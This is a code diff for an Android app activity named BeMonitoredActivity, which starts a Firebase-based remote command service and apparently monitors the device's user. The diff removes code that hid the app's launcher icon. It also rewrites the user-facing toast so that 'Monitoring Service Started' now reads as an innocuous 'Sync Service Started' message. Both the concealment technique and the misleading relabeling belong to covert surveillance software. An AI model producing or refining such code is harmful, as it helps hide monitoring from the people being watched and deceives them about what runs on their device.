@@ -78,15 +78,8 @@ class BeMonitoredActivity : AppCompatActivity() {
         val intent = Intent(this, FirebaseCommandService::class.java)
         intent.putExtra("SESSION_KEY", sessionKey)
         startForegroundService(intent)
-        Toast.makeText(this, "Monitoring Service Started. App icon hidden.", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "Sync Service Started. System syncing in background.", Toast.LENGTH_SHORT).show()
 
-        // Hide app icon
-        val componentName = android.content.ComponentName(this, "com.jonas.x24.MainActivityAlias")
-        packageManager.setComponentEnabledSetting(
-            componentName,
-            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            0 // Removed DONT_KILL_APP so it takes effect immediately by system
-        )
         finishAffinity() // Close current activities
     }
 }
